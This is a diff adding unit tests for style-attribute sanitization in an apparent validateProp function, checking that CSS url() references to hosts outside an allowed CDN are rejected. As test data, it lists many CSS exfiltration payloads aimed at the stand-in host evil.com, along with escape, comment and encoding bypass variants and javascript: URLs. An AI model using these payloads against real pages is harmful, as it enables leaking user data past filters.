@@ -379,6 +379,90 @@ describe('validateProp', () => {
     })
   })
 
+  describe('style', () => {
+    const options = { allowedImagePrefixes: ['https://cdn.myapp.com'] }
+
+    it.each([
+      'color:red; width:calc(100% - 2px)',
+      'background:url(https://cdn.myapp.com/a.png)',
+      "background:url('/a.png') no-repeat",
+      'mask:url(#m)',
+      'background:url()',
+      // Strings outside url() are never fetched
+      "content:'url(https://evil.com/x)'",
+      // No comments inside an unquoted url(): a same-origin path
+      'background:url(/*x*/https://evil.com/x)',
+    ])('keeps %j', (style) => {
+      expect(validateProp('style', style, options)).toBe(style)
+    })
+
+    it.each([
+      'background:url(https://evil.com/?secret)',
+      "background:url('https://evil.com/?secret')",
+      'background:url(  "https://evil.com/?secret"  )',
+      'background:URL(https://evil.com/?secret)',
+      'background:url(//evil.com/?secret)',
+      'background:url(https://evil.com/?secret',
+      'background:/**/url(https://evil.com/?secret)',
+      'cursor:url(https://cdn.myapp.com/c.cur), url(https://evil.com/c.cur), auto',
+      "font-family:'a(b'; background:url(https://evil.com/?secret)",
+      '--bg:url(https://evil.com/?secret)',
+      "background-image:image-set('https://evil.com/a.png' 1x)",
+      'background-image:-webkit-image-set(url(https://evil.com/a.png) 1x)',
+      'background:url(javascript:alert(1))',
+      'background:url(https://cdn.myapp.com%2F@evil.com/x)',
+    ])('rejects %j', (style) => {
+      expect(validateProp('style', style, options)).toBe(REJECTED_PROP)
+    })
+
+    it.each([
+      ['an escaped function name', 'background:u\\72l(https://evil.com/?secret)'],
+      ['a long escape with its whitespace', 'background:u\\000072 l(https://evil.com/?secret)'],
+      ['an escape in the URL', 'background:url(\\68ttps://evil.com/?secret)'],
+      ['an escaped colon', 'background:url(https\\3a //evil.com/?secret)'],
+      ['a line continuation in a string', 'background:url("https://evil.com/\\\n?secret")'],
+      ['entity-encoded quotes', 'background:url(&quot;https://evil.com/?secret&quot;)'],
+      ['a quote inside a comment', "/* ' */ background:url('https://evil.com/?secret')"],
+      ['an escaped quote outside a string', "a:x\\27 ; background:url(https://evil.com/?secret); b:'"],
+      ['a CRLF after an escape', 'background:u\\72\r\nl(https://evil.com/?secret)'],
+      ['an escaped paren in the URL', 'background:url(https://evil.com/\\)?secret)'],
+    ])('rejects %s', (_, style) => {
+      expect(validateProp('style', style, options)).toBe(REJECTED_PROP)
+    })
+
+    it('checks style objects from bindings', () => {
+      expect(validateProp(':style', '{"backgroundImage":"url(https://evil.com/?secret)"}', options)).toBe(REJECTED_PROP)
+      expect(validateProp(':style', '{"color":"red"}', options)).toBe('{"color":"red"}')
+    })
+
+    it('does not rewrite to defaultOrigin', () => {
+      expect(
+        validateProp('style', 'background:url(https://evil.com/x.png)', {
+          ...options,
+          defaultOrigin: 'https://cdn.myapp.com',
+        })
+      ).toBe(REJECTED_PROP)
+    })
+
+    it('leaves style alone without prefix options, except unsafe protocols', () => {
+      expect(validateProp('style', 'background:url(https://any.com/a.png)')).toBe(
+        'background:url(https://any.com/a.png)'
+      )
+      expect(validateProp('style', 'background:url(javascript:alert(1))')).toBe(REJECTED_PROP)
+    })
+
+    it('scans long styles in linear time', () => {
+      const run = (n: number) => {
+        const style = 'url('.repeat(n) + '\\'.repeat(n) + "'".repeat(n) + '/*'.repeat(n)
+        const start = performance.now()
+        validateProp('style', style, options)
+        return performance.now() - start
+      }
+      run(1000)
+      expect(run(100_000)).toBeLessThan(500)
+    })
+  })
+
   describe('longdesc', () => {
     it('is checked as a link URL', () => {
       expect(validateProp('longdesc', 'javascript:alert(1)')).toBe(REJECTED_PROP)
